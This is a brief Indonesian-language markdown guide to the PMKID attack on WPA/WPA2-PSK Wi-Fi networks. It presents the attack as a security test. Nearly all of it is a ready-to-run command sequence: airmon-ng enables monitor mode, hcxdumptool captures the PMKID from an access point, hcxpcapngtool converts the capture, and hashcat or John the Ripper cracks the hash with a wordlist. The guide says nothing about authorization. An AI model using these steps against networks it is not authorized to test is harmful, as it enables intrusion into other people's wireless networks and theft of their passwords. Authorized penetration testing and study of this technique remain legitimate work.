# PMKID Attack

PMKID Attack adalah teknik yang digunakan untuk menguji keamanan jaringan Wi‑Fi WPA/WPA2‑PSK dengan cara menangkap PMKID langsung dari access point (AP) tanpa perlu melakukan serangan deauthentication seperti pada serangan tradisional yang digunakan untuk menangkap 4‑Way Handshake.

> [!NOTE]
> Tidak semua Router atau AP mendukung PMKID.

## Langkah-Langkah

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface]
```

#### 2. Capture PMKID

```
hcxdumptool -i [interface] -w [output] --rds=2 --disable_disassociation --exitoneapol=1
```

#### 3. Convert Hasil Capture

Hashcat:

```
hcxpcapngtool [file_capture] -o [output]
```

John the Ripper:

```
hcxpcapngtool [file_capture] --john=[output]
```

#### 4. Crack Hash

Hashcat:

```
hashcat -a 0 -m 22000 [file_hash] [wordlist]
```

John the Ripper:

```
john --format=wpapsk --wordlist=[wordlist] [file_hash]
```
